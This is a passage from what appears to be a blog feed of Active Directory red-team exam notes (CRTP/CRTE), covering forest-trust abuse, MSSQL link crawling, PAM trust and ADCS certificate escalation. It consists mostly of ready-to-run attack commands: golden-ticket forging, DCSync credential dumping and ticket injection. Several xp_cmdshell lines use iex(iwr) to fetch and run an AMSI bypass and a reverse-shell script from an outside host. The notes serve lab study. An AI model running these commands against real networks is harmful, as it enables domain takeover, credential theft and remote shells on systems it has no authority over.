      <p><strong>Create an inter-realm ticket and Inject the SIDHistory</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\Users\Public\BetterSafetyKatz.exe</span><span class="w"> </span><span class="s2">"kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /rc4:&lt;hash&gt; /service:krbtgt /target:domain.local /sids:S-1-5-21-4066061358-3942393892-617142613-1103 /ticket:C:\Users\Public\domainnet.kirbi"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Request a TGS for HTTP</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\Users\Public\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgs</span><span class="w"> </span><span class="nx">/ticket:C:\Users\Public\domainnet.kirbi</span><span class="w"> </span><span class="nx">/service:HTTP/domain-net.domain.local</span><span class="w"> </span><span class="nx">/dc:dc.domain.local</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">domain-net.domain.local</span><span class="w"> </span><span class="nx">cmd</span><span class="w">
</span><span class="n">whoami</span><span class="w"> </span><span class="nx">/groups</span><span class="w">
</span></code></pre></div>      </div>

    </div>
  </details>

  <details>
    <summary>MSSQL</summary>
    <div class="content">

      <p><strong>Enumerate database links</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PowerupSQL-master\PowerupSQL.psd1</span><span class="w">
</span><span class="n">Get-SQLInstanceDomain</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Get-SQLServerInfo</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span><span class="n">Get-SQLServerLink</span><span class="w"> </span><span class="nt">-Instance</span><span class="w"> </span><span class="nx">us-mssql.domain.local</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span><span class="n">Get-SQLServerLinkCrawl</span><span class="w"> </span><span class="nt">-Instance</span><span class="w"> </span><span class="nx">us-mssql</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span><span class="n">Get-SQLServerLinkCrawl</span><span class="w"> </span><span class="nt">-Instance</span><span class="w"> </span><span class="nx">us-mssql</span><span class="w"> </span><span class="nt">-Query</span><span class="w"> </span><span class="s1">'exec master..xp_cmdshell ''whoami'''</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Open a Listener</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="n">\powercat.ps1</span><span class="w">
</span><span class="nx">powercat</span><span class="w"> </span><span class="nt">-l</span><span class="w"> </span><span class="nt">-v</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nx">443</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">1000</span><span class="w">
</span><span class="n">Get-SQLServerLinkCrawl</span><span class="w"> </span><span class="nt">-Instance</span><span class="w"> </span><span class="nx">us-mssql</span><span class="w"> </span><span class="nt">-Query</span><span class="w"> </span><span class="s1">'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://192.168.100.X/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.100.X/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.100.X/Invoke-PowerShellTcpEx.ps1)"'''</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Enable RPC Out and xp_cmdshell with SA permission</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-SqlCmd</span><span class="w"> </span><span class="nt">-Query</span><span class="w"> </span><span class="s2">"exec sp_serveroption @server='db-sqlsrv', @optname='rpc', @optvalue='TRUE'"</span><span class="w">
</span><span class="n">Invoke-SqlCmd</span><span class="w"> </span><span class="nt">-Query</span><span class="w"> </span><span class="s2">"exec sp_serveroption @server='db-sqlsrv', @optname='rpc out', @optvalue='TRUE'"</span><span class="w">
</span><span class="n">Invoke-SqlCmd</span><span class="w"> </span><span class="nt">-Query</span><span class="w"> </span><span class="s2">"EXECUTE ('sp_configure ''show advanced options'',1;reconfigure;') AT ""db-sqlsrv"""</span><span class="w">
</span><span class="n">Invoke-SqlCmd</span><span class="w"> </span><span class="nt">-Query</span><span class="w"> </span><span class="s2">"EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure') AT ""db-sqlsrv"""</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Now Try to execute commands recursively again</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-SQLServerLinkCrawl</span><span class="w"> </span><span class="nt">-Instance</span><span class="w"> </span><span class="nx">us-mssql</span><span class="w"> </span><span class="nt">-Query</span><span class="w"> </span><span class="s1">'exec master..xp_cmdshell ''whoami'''</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Execute commands in a particular link database</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-SQLServerLinkCrawl</span><span class="w"> </span><span class="nt">-Instance</span><span class="w"> </span><span class="nx">us-mssql</span><span class="w"> </span><span class="nt">-Query</span><span class="w"> </span><span class="s1">'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://192.168.100.x/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.100.x/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.100.x/Invoke-PowerShellTcpEx.ps1)"'''</span><span class="w"> </span><span class="nt">-QueryTarget</span><span class="w"> </span><span class="nx">db-sqlsrv</span><span class="w">
</span></code></pre></div>      </div>

    </div>
  </details>

  <details>
    <summary>Foreign Security Principals (FSPs)</summary>
    <div class="content">
      <p> </p>

      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">iex</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s1">'http://192.168.100.x/PowerView.ps1'</span><span class="p">)</span><span class="w">
</span><span class="nx">Note:</span><span class="w"> </span><span class="nx">Make</span><span class="w"> </span><span class="nx">sure</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">bypass</span><span class="w"> </span><span class="nx">AMSI</span><span class="w"> </span><span class="nx">before</span><span class="w"> </span><span class="nx">executing</span><span class="w"> </span><span class="nx">powershell</span><span class="w"> </span><span class="nx">commands</span><span class="w">
</span><span class="n">Get-ForestTrust</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Search for</strong>:</p>

      <ul>
        <li>TrustType: Forest</li>
        <li>TrustDirection: Bidirectional</li>
      </ul>

      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Find-InterestingDomainAcl</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w"> </span><span class="nt">-Domain</span><span class="w"> </span><span class="nx">dbvendor.local</span><span class="w">
</span></code></pre></div>      </div>

      <blockquote>
        <p>See if any <em>IdentityReferenceName</em> has <em>ActiveDirectoryRights</em> (GenericAll) to any <em>ObjectDN</em></p>
      </blockquote>

      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Set-DomainUserPassword</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">dbxsvc</span><span class="w"> </span><span class="nt">-AccountPassword</span><span class="w"> </span><span class="p">(</span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s1">'Password@123'</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="p">)</span><span class="w"> </span><span class="nt">-Domain</span><span class="w"> </span><span class="nx">dbvendor.local</span><span class="w"> </span><span class="err">–</span><span class="nx">Verbose</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Enumerate FSPs</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Find-ForeignGroup</span><span class="w"> </span><span class="err">–</span><span class="nx">Verbose</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Get-DomainUser</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-DomainUser</span><span class="w"> </span><span class="nt">-Domain</span><span class="w"> </span><span class="nx">dbvendor.local</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">ObjectSid</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s1">'S-1-5-21-569087967-1859921580-1949641513-4101'</span><span class="p">}</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Accessing with WINRS</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">db-dc.db.local</span><span class="w"> </span><span class="nt">-u</span><span class="p">:</span><span class="nx">dbvendor\dbxsvc</span><span class="w"> </span><span class="nt">-p</span><span class="p">:</span><span class="nx">Password</span><span class="err">@</span><span class="nx">123</span><span class="w"> </span><span class="s2">"whoami"</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Accessing with PowerShell Remote</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$passwd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s1">'Password@123'</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
</span><span class="nv">$creds</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="w"> </span><span class="p">(</span><span class="s2">"dbvendor\dbxsvc"</span><span class="p">,</span><span class="w"> </span><span class="nv">$passwd</span><span class="p">)</span><span class="w">
</span><span class="nv">$dbdc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-PSSession</span><span class="w"> </span><span class="nt">-Computername</span><span class="w"> </span><span class="nx">db-dc.db.local</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$creds</span><span class="w">
</span><span class="n">Invoke-Command</span><span class="w"> </span><span class="nt">-scriptblock</span><span class="p">{</span><span class="n">whoami</span><span class="p">;</span><span class="n">hostname</span><span class="p">}</span><span class="w"> </span><span class="nt">-Session</span><span class="w"> </span><span class="nv">$dbdc</span><span class="w">
</span></code></pre></div>      </div>

    </div>
  </details>

  <details>
    <summary>PAM Trust</summary>
    <div class="content">
      <p> </p>

      <p><strong>Enumerate Foreign Security Principals</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADObject</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="p">{</span><span class="n">objectClass</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"foreignSecurityPrincipal"</span><span class="p">}</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="n">domain.local</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Find out which group DA it is a member of</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADGroup</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="nx">Member</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="nx">domain.local</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">Member</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s1">'S-1-5-21-2781415573-3701854478-2406986946-500'</span><span class="p">}</span><span class="w">
</span></code></pre></div>      </div>

      <blockquote>
        <p>In this case the DA is a member of the built-in administrators group on the target forest</p>
      </blockquote>

      <p><strong>So we need to grab a DA access</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/domain:</span><span class="err">&lt;</span><span class="nx">domain</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/user:administrator</span><span class="w"> </span><span class="nx">/aes256:</span><span class="err">&lt;</span><span class="nx">hash</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/dc:</span><span class="err">&lt;</span><span class="nx">dc</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/createnetonly:C:\Windows\System32\cmd.exe</span><span class="w"> </span><span class="nx">/show</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nx">F</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">xcopy</span><span class="w"> </span><span class="nx">C:\AD\Tools\InviShell\InShellProf.dll</span><span class="w"> </span><span class="nx">\\dc.domain.local\C</span><span class="err">$</span><span class="nx">\Users\Public\InShellProf.dll</span><span class="w"> </span><span class="nx">/Y</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nx">F</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">xcopy</span><span class="w"> </span><span class="nx">C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat</span><span class="w"> </span><span class="nx">\\dc.domain.local\C</span><span class="err">$</span><span class="nx">\Users\Public\RunWithRegistryNonAdmin.bat</span><span class="w"> </span><span class="nx">/Y</span><span class="w">
</span><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">dc.domain.local</span><span class="w"> </span><span class="nx">cmd</span><span class="w">
</span><span class="n">C:\Users\Public\RunWithRegistryNonAdmin.bat</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Check if PAM trust is enabled</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADTrust</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="p">{(</span><span class="n">ForestTransitive</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="nv">$True</span><span class="p">)</span><span class="w"> </span><span class="o">-and</span><span class="w"> </span><span class="p">(</span><span class="n">SIDFilteringQuarantined</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="nv">$False</span><span class="p">)}</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Search for</strong>:</p>

      <ul>
        <li>ForestTransitive : True</li>
        <li>SIDFilteringForestAware : False</li>
        <li>the DistinguishedName</li>
      </ul>

      <p><strong>Use the privileges of DA to extract credentials of DA of the target Forest</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\SafetyKatz.exe</span><span class="w"> </span><span class="s2">"lsadump::dcsync /user:domain\Administrator /domain:domain.local"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
</span><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/domain:domain.local</span><span class="w"> </span><span class="nx">/user:administrator</span><span class="w"> </span><span class="nx">/aes256:</span><span class="err">&lt;</span><span class="nx">hash</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/dc:</span><span class="err">&lt;</span><span class="nx">dc</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/createnetonly:C:\Windows\System32\cmd.exe</span><span class="w"> </span><span class="nx">/show</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nx">F</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">xcopy</span><span class="w"> </span><span class="nx">C:\AD\Tools\InviShell\InShellProf.dll</span><span class="w"> </span><span class="nx">\\dc.domain.local\C</span><span class="err">$</span><span class="nx">\Users\Public\InShellProf.dll</span><span class="w"> </span><span class="nx">/Y</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nx">F</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">xcopy</span><span class="w"> </span><span class="nx">C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat</span><span class="w"> </span><span class="nx">\\dc.domain.local\C</span><span class="err">$</span><span class="nx">\Users\Public\RunWithRegistryNonAdmin.bat</span><span class="w"> </span><span class="nx">/Y</span><span class="w">
</span><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">dc.domain.local</span><span class="w"> </span><span class="nx">cmd</span><span class="w">
</span><span class="n">C:\Users\Public\RunWithRegistryNonAdmin.bat</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Enumerate other Forests</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADTrust</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="p">{(</span><span class="n">ForestTransitive</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="nv">$True</span><span class="p">)</span><span class="w"> </span><span class="o">-and</span><span class="w"> </span><span class="p">(</span><span class="n">SIDFilteringQuarantined</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="nv">$False</span><span class="p">)}</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="n">production.local</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Search for</strong>:</p>

      <ul>
        <li>ForestTransitive : True</li>
        <li>SIDFilteringForestAware : True</li>
      </ul>

      <p><strong>Check the membership of Shadow Security Principals</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADObject</span><span class="w"> </span><span class="nt">-SearchBase</span><span class="w"> </span><span class="p">(</span><span class="s2">"CN=Shadow Principal Configuration,CN=Services,"</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="n">Get-ADRootDSE</span><span class="p">)</span><span class="o">.</span><span class="nf">configurationNamingContext</span><span class="p">)</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">Name</span><span class="p">,</span><span class="w"> </span><span class="nx">member</span><span class="p">,</span><span class="w"> </span><span class="nx">msDS-ShadowPrincipalSid</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">fl</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Obtain the IP of Forest</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-DnsServerZone</span><span class="w"> </span><span class="nt">-ZoneName</span><span class="w"> </span><span class="nx">production.local</span><span class="w"> </span><span class="o">|</span><span class="n">fl</span><span class="w"> </span><span class="o">*</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Modify WSMan Trustedhosts property</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Note:</span><span class="w"> </span><span class="nx">Run</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">an</span><span class="w"> </span><span class="nx">elevated</span><span class="w"> </span><span class="nx">shell</span><span class="w">
</span><span class="n">Set-Item</span><span class="w"> </span><span class="nx">WSMan:\localhost\Client\TrustedHosts</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Use PowerShell Remoting</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\SafetyKatz.exe</span><span class="w"> </span><span class="s2">"sekurlsa::opassth /user:administrator /domain:domain.local /ntlm:&lt;hash&gt; /run:powershell.exe"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
</span><span class="n">Enter-PSSession</span><span class="w"> </span><span class="nx">192.168.102.1</span><span class="w"> </span><span class="nt">-Authentication</span><span class="w"> </span><span class="nx">NegotiateWithImplicitCredential</span><span class="w">
</span></code></pre></div>      </div>

    </div>
  </details>

  <details>
    <summary>Mindmaps</summary>
    <div class="content">
      <p> </p>

      <p>AD Mindmap:</p>

      <p><img src="/assets/images/posts/crte/6.png" alt="Alt text" class="align-center" /></p>

      <p>AD Recommendations:</p>

      <p><img src="/assets/images/posts/crte/7.png" alt="Alt text" class="align-center" /></p>

      <p>DACL:</p>

      <p><img src="/assets/images/posts/crte/8.png" alt="Alt text" class="align-center" /></p>

      <p>Bypass AV:</p>

      <p><img src="/assets/images/posts/crte/9.png" alt="Alt text" class="align-center" /></p>

      <p>Bloodhound Collector:</p>

      <p><img src="/assets/images/posts/crte/10.png" alt="Alt text" class="align-center" /></p>

    </div>
  </details>
</div>]]></content><author><name>Nullified</name></author><category term="notes" /><category term="crte" /><category term="intermediate" /><category term="AD" /><category term="Windows" /><category term="cheatsheet" /><summary type="html"><![CDATA[Cheat Sheet for CRTP/CRTE exams]]></summary></entry><entry><title type="html">4 - Cross Domain Attacks</title><link href="http://localhost:4000/notes/crte/cross/" rel="alternate" type="text/html" title="4 - Cross Domain Attacks" /><published>2023-12-30T00:00:00+06:00</published><updated>2023-12-30T00:00:00+06:00</updated><id>http://localhost:4000/notes/crte/cross</id><content type="html" xml:base="http://localhost:4000/notes/crte/cross/"><![CDATA[<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="nullified" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FF813F" data-position="Right" data-x_margin="18" data-y_margin="18"></script>

<h1 id="adcs">ADCS</h1>

<p>Active Directory Certificate Services (AD CS) enables use of Public Key Infrastructure (PKI) in active directory forest.</p>

<blockquote>
  <p>AD CS helps in authenticating users and machines, encrypting and signing documents, filesystem, emails and more.</p>
</blockquote>

<blockquote>
  <p><em>AD CS is the Server Role that allows you to build a public key infrastructure (PKI) and provide public key cryptography, digital certificates, and digital signature capabilities for your organization</em>.</p>
</blockquote>

<ul>
  <li><strong>CA</strong> - The certification authority that issues certificates. The server with AD CS role (DC or separate) is the CA.</li>
  <li><strong>Certificate</strong> - Issued to a user or machine and can be used for authentication, encryption, signing etc.</li>
  <li><strong>CSR</strong> - Certificate Signing Request made by a client to the CA to request a certificate.</li>
  <li><strong>Certificate Template</strong> - Defines settings for a certificate. Contains information like - enrolment permissions, EKUs, expiry etc.</li>
  <li><strong>EKU OIDs</strong> - Extended Key Usages Object Identifiers. These dictate the use of a certificate template (Client authentication, Smart Card Logon, SubCA etc.)</li>
</ul>

<p>We can use the Certify tool to enumerate (and for other attacks) AD CS in the target forest:</p>

<p><a href="https://github.com/GhostPack/Certify">Certify on GitHub</a></p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Certify.exe</span><span class="w"> </span><span class="nx">cas</span><span class="w">
</span></code></pre></div></div>

<p>Enumerate the templates:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Certify.exe</span><span class="w"> </span><span class="nx">find</span><span class="w">
</span></code></pre></div></div>

<p>Enumerate vulnerable templates:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Certify.exe</span><span class="w"> </span><span class="nx">find</span><span class="w"> </span><span class="nx">/vulnerable</span><span class="w">
</span></code></pre></div></div>

<p>Common requirements/misconfigurations for all the Escalations:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- CA grants normal/low-privileged users enrollment rights
- Manager approval is disabled
- Authorization signatures are not required
- The target template grants normal/low-privileged users enrollment rights
</code></pre></div></div>

<h2 id="escalation">Escalation</h2>

<ul>
  <li>In techcorp, the user pawadmin has enrollment rights to a template <strong>-ForAdminsofPrivilegedAccessWorkstations</strong></li>
  <li>The template has <strong>ENROLLEE_SUPPLIES_SUBJECT</strong> value for msPKI-Certificates-Name-Flag. (<strong>ESC1</strong>)</li>
  <li>This means pawadmin can request certificate for ANY user.</li>
</ul>

<p>Note that this does not show up when we enumerate vulnerable templates in Certify. Use:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Certify.exe</span><span class="w"> </span><span class="nx">find</span><span class="w">
</span><span class="n">Certify.exe</span><span class="w"> </span><span class="nx">find</span><span class="w"> </span><span class="nx">/enrolleeSuppliesSubject</span><span class="w">
</span></code></pre></div></div>

<ul>
  <li>We have the certificate of pawadmin that we extracted from us-jump. (<strong>THEFT4</strong>)</li>
</ul>

<p>Use the certificate to request a TGT for pawadmin and inject it:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/user:pawadmin</span><span class="w"> </span><span class="nx">/certificate:C:\AD\Tools\pawadmin.pfx</span><span class="w"> </span><span class="nx">/password:SecretPass</span><span class="err">@</span><span class="nx">123</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span></code></pre></div></div>

<h2 id="escalation-to-da">Escalation to DA</h2>

<p>Request a certificate for DA!</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\Certify.exe</span><span class="w"> </span><span class="nx">request</span><span class="w"> </span><span class="nx">/ca:Techcorp-DC.techcorp.local\TECHCORP-DC-CA</span><span class="w"> </span><span class="nx">/template:ForAdminsofPrivilegedAccessWorkstations</span><span class="w"> </span><span class="nx">/altname:Administrator</span><span class="w">
</span></code></pre></div></div>

<p>Convert from cert.pem to pfx:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\openssl\openssl.exe</span><span class="w"> </span><span class="nx">pkcs12</span><span class="w"> </span><span class="nt">-in</span><span class="w"> </span><span class="nx">C:\AD\Tools\cert.pem</span><span class="w"> </span><span class="nt">-keyex</span><span class="w"> </span><span class="nt">-CSP</span><span class="w"> </span><span class="s2">"Microsoft Enhanced Cryptographic Provider v1.0"</span><span class="w"> </span><span class="nt">-export</span><span class="w"> </span><span class="nt">-out</span><span class="w"> </span><span class="nx">C:\AD\Tools\DA.pfx</span><span class="w">
</span></code></pre></div></div>

<p>Request DA TGT and inject it:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/user:Administrator</span><span class="w"> </span><span class="nx">/certificate:C:\AD\Tools\DA.pfx</span><span class="w"> </span><span class="nx">/password:SecretPass</span><span class="err">@</span><span class="nx">123</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span></code></pre></div></div>

<h2 id="escalation-to-ea">Escalation to EA</h2>

<p>Request a certificate for EA!</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\Certify.exe</span><span class="w"> </span><span class="nx">request</span><span class="w"> </span><span class="nx">/ca:Techcorp-DC.techcorp.local\TECHCORP-DC-CA</span><span class="w"> </span><span class="nx">/template:ForAdminsofPrivilegedAccessWorkstations</span><span class="w"> </span><span class="nx">/altname:Administrator</span><span class="w">
</span></code></pre></div></div>

<p>Convert from cert.pem to pfx:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\openssl\openssl.exe</span><span class="w"> </span><span class="nx">pkcs12</span><span class="w"> </span><span class="nt">-in</span><span class="w"> </span><span class="nx">C:\AD\Tools\cert.pem</span><span class="w"> </span><span class="nt">-keyex</span><span class="w"> </span><span class="nt">-CSP</span><span class="w"> </span><span class="s2">"Microsoft Enhanced Cryptographic Provider v1.0"</span><span class="w"> </span><span class="nt">-export</span><span class="w"> </span><span class="nt">-out</span><span class="w"> </span><span class="nx">C:\AD\Tools\EA.pfx</span><span class="w">
</span></code></pre></div></div>

<p>Request EA TGT and inject it:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/user:techcorp.local\Administrator</span><span class="w"> </span><span class="nx">/dc:techcorp-dc.techcorp.local</span><span class="w"> </span><span class="nx">/certificate:C:\AD\Tools\EA.pfx</span><span class="w"> </span><span class="nx">/password:SecretPass</span><span class="err">@</span><span class="nx">123</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span></code></pre></div></div>

<h1 id="shadow-credentials">Shadow Credentials</h1>

<p>Users and Computers have <strong>msDS-KeyCredentialLink</strong> attribute that contains the raw public keys of certificate that can be used as an alternate credential.</p>

<ul>
  <li>This attribute is used when we configure Windows Hello for Business (WHfB)</li>
</ul>

<blockquote>
  <p>By default, Key Admins and Enterprise Key Admins have rights to modify the <strong>msDS-KeyCredentialLink attribute</strong>.</p>
</blockquote>

<ul>
